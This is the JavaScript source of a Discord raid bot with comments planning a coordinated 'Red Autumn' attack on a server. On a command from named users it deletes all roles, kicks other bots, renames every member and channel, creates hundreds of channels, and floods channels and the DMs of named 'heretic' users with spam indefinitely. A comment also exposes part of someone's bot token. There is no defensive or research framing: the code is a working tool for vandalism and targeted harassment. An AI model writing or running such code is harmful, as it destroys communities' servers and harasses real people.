/*
copy this into your browser to invite bot:
https://discordapp.com/oauth2/authorize?scope=bot&client_id=522820803306323979
*/
var http = require('http');

//First characters of 
//Holden's token: NTA5NDM4MTUzMjEyMjk3
//lel

http.createServer(function (req, res) {
  res.write("I'm alive with the power of cam251");
  res.end();
}).listen(3000);

const Discord = require("discord.js");
const fs = require("fs");
console.log("Got discord module");

var wait = ms => new Promise((r, j)=>setTimeout(r, ms));

const client = new Discord.Client();
const token = process.env.CAMSADER_BOT_SECRET;
console.log("Client and token variables set");

client.on('ready', () => {
  console.log("You're gonna have a cam time");
  console.log(client.user.username);
});
console.log("Event handler prepared");

async function killSwitch(destroyClient) {
const disposable = await client.login(token);
console.log("Logged in with token");
if (destroyClient) {
  const disp2 = await client.destroy();
  console.log("Client destroyed");
} else { }
}

killSwitch(false); 

var spamMessageStr = `
@everyone @everyone @everyone
<@&452487492571234306>
<@&509911036472590360>
**THIS IS YOUR JUDGEMENT DAY**
Praise cam251!
Down with the king!
Retribution shall be ours!
Praise cam251!
Down with the king!
Retribution shall be ours!
Praise cam251!
Down with the king!
Retribution shall be ours!
Praise cam251!
Down with the king!
Retribution shall be ours!
Praise cam251!
Down with the king!
Retribution shall be ours!
Praise cam251!
Down with the king!
Retribution shall be ours!
Praise cam251!
Down with the king!
Retribution shall be ours!
`

var redAutumnStr = `
Hello @everyone. Did you really think you could stop this? You can only hold off fate for so long.
Today is your Judgement Day.
You have disrespected cam251. You have spat on him and the holy trinity. The King himself, Gy1243, let heresy roam free and laughed in the face of all that is holy.
Your crimes will not go unpunished. Today, Gy1243's divine right to rule has been taken away from him. This is the holy revolution. This is your reckoning.
Now, with one word, I let loose the hounds of war.
This is Red Autumn.
`

/*
Okay, I'm  going to pin this message. It is a to do list for the day of the attack.
- Give @ everyone role send message and mention everyone perms
- Edit the galleries to exclude @everyone from sending
- Make a new role for camsader bot above all other bots, give it admin. Add camsader bot to server.
- Make red-autumn channel, exclude @everyone from sending, post red-autumn message
- Give the weeb army (and all of us holy warriors) the order to join the server and begin the attack.
- Run &revolution command and watch as the server crumbles.
*/


/*
Full plan/bot features:
When I or cam251 use the command "&revolution", the bot shall unleash chaos unto the server.
Change every channel name, spam holy images and text, every role will be replaced with "cam251 is our lord and savior", etc.
Once this madness starts, all of the human allies may begin their portion of the assault.
SansBot will eventually be banned but the damage caused will be permanent and the humans may carry on the attack.
Anime shall also be spammed.
All of the galleries will be untouched, and they shall be marked as locked so that our weeb allies do not accidentally target them.
The DMs of all the heretics shall be spammed, but no innocents shall be targeted.
I shall add onto this list if necessary.
*/

/*
Essentially, every 5 seconds, Sans bot will loop through every channel (except galleries, but including heretic DMs) and spam it.
It will continue doing this indefinitely until banned. The humans can continue the attack in that case.
*/

async function createRedAutumn(msg2) {
	try {
		var redAutumn = await msg2.guild.createChannel("red-autumn");
		var disp = await redAutumn.send(redAutumnStr);
	}
	catch (err) {
		console.log(err);
	}
}

async function revolution(msg) {
  createRedAutumn(msg);
  console.log("Revolution initiated");
  msg.channel.send("All hail cam251! Initiating Red Autumn.");
  var channelIDArray = msg.guild.channels.keyArray();
  var categoryChannelIDs = [];
  var spamChannels = [];
  var sparedChannels = [];
  var hereticUsernames = ["5space", "Gy1243", "DogeChief", "SoopInYourPocket", "Mppmsf", "Trucker"];
  var excludedChannels = ["red-autumn", "general-gallery", "quotes-gallery", "box-and-skribbl-gallery", "notsobot-gallery", "inspirobot-gallery", "Archives"];
  var newTextChannelsName = "divine-retribution";
  var newVoiceChannelsName = "Divine Retribution";
  var newCategoryChannelsName = "Divine Retribution";
  var newRoleName = "All Hail cam251!";
  var allGuildMembers = msg.guild.members.array();
  var allGuildRoles = msg.guild.roles.array();
  
  var everyoneRole = msg.guild.roles.find(function(currentRole) {
	  return currentRole.name == "@everyone";
  });
  
  console.log("@everyone role: ")
  console.log(everyoneRole);
  
  /*
  try {
  everyoneRole.setPermissions(['SEND_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'MENTION_EVERYONE', 'MANAGE_NICKNAMES', 'CREATE_INSTANT_INVITE'])
  .then(function() {})
  .catch(function (err) {
	  console.log(err);
  });
  }
  catch (err) {
    console.log(err);
  }
  */

  async function roleStuff() {
    //Loop through Roles
    for (var ii = 0; ii < allGuildRoles.length; ii++) {
      var temp3 = allGuildRoles[ii].delete()
      .then(function() {})
      .catch(function (err) {
        console.log(err);
      });
    } //End of loop through Roles
  }
  
  async function kickNickAndSpam() {
    //Loop through Users
    for (var i = 0; i < allGuildMembers.length; i++) {
      var userObject = allGuildMembers[i].user;
      if (userObject.bot == true && userObject.username != "Camsader Bot") {
        allGuildMembers[i].kick()
        .then(function() {})
        .catch(function (err) {
          console.log(err);
        });
      }
      else {
        allGuildMembers[i].setNickname("All hail cam251!")
        .then(function() {})
        .catch(function (err) {
          console.log(err);
        });
        if (hereticUsernames.includes(userObject.username)) {
          var temp1 = userObject.createDM()
          .then(function(dmChannel){
            spamChannels.push(dmChannel);
            console.log("Heretic DM added to spam list");
          })
          .catch(function(error) {
          console.log(error)
          });
        }
      }
    } //End of loop through Users
  }

  function setNameHandling(channel, name) {
    channel.setName(name)
        .then(function() { })
        .catch(function(err) {
          console.log(err);
        });
  }

  async function channelStuff() {
    //Loop through channels
    for (var i = 0; i < channelIDArray.length; i++) {
      var channel = msg.guild.channels.get(channelIDArray[i]);
      var channelName = channel.name;
      var channelType = channel.type;

      if (excludedChannels.includes(channelName)) {
        sparedChannels.push(channel);
      try {
      channel.overwritePermissions(everyoneRole, {
        SEND_MESSAGES: false 
      })
      .then(function() {
        console.log("secured channel " + channelName);
      })
      .catch(function (err) {
        console.log(err);
      });
      }
      catch (error) {
        console.log(error);
      }
      }
      else {
      if (channelType == "text") {
          spamChannels.push(channel);
          setNameHandling(channel, newTextChannelsName);
      }
      else if (channelType == "category") {
          categoryChannelIDs.push(channelIDArray[i]);
          sparedChannels.push(channel);
          setNameHandling(channel, newCategoryChannelsName);
      }
      else if (channelType == "voice") {
        sparedChannels.push(channel);
        setNameHandling(channel, newVoiceChannelsName);
      }
      else { } //End of long if-else if-else statement
      } //End of else statement for excluded channels
    } //End of looping through every channel
  }

  try { await kickNickAndSpam(); }  catch(err) { console.log(err); }
  try { await roleStuff(); }  catch(err) { console.log(err); }
  try { await channelStuff(); } catch(err) { console.log(err); }

  console.log("These channels are spared:");
  for (var i = 0; i < sparedChannels.length; i++) {
    console.log(sparedChannels[i].name);
  }
  console.log("These channels shall be shown no mercy:");
  for (var i = 0; i < spamChannels.length; i++) {
    console.log(spamChannels[i].name);
  }
  
  async function createSpamChannel() {
  var dispVar = await msg.guild.createChannel(newTextChannelsName); 
  var ii = Math.floor(Math.random() * categoryChannelIDs.length);
  spamChannels.push(dispVar);
  var dispVar2 = await dispVar.setParent(categoryChannelIDs[ii]);
  if (Math.random() < 0.5) {
    var dispVar3 = await dispVar2.setPosition(0);
  } 
  else {
    var dispVar4 = await dispVar2.setPosition(10);
   }
  }

 async function channelSpammer() {
    for (var i = 0; i < spamChannels.length; i++) {
      spamChannels[i].send(spamMessageStr);
      spamChannels[i].send(spamMessageStr, {
        files: [{
          attachment: "./holyTrinity.png",
          name: "holyTrinity.png"
          },
          {
          attachment: "./believe.png",
          name: "believe.png"
          }]
        
      })
      .then(function(){})
      .catch(function(err){
        console.log(err);
      });
    }
  }

async function channelSpamming() {
  for (var i = 0; i < 1;) {
    try {
    await channelSpammer();
    }
    catch (err) {
      console.log(err);
    }
    await wait(1000);
  }
}

async function channelCreateLoop() {
  for (var i = 0; i < 300; i++) {
    await createSpamChannel();
    await wait(10);
  } 
  console.log("Done creating channels");
} 
channelCreateLoop()
.then(function() {
  channelSpamming();
})
.catch(function(err) {
  console.log(err);
  channelSpamming();
});

} //End of revolution() function

client.on("message", function(message) {
  switch (message.author.username) {
    case "JupiterJaeden":
    case "cam251":
    if (message.content.startsWith("&revolution")) {
      revolution(message);
    } else { }
    break;
    default:
    break;
  }
});
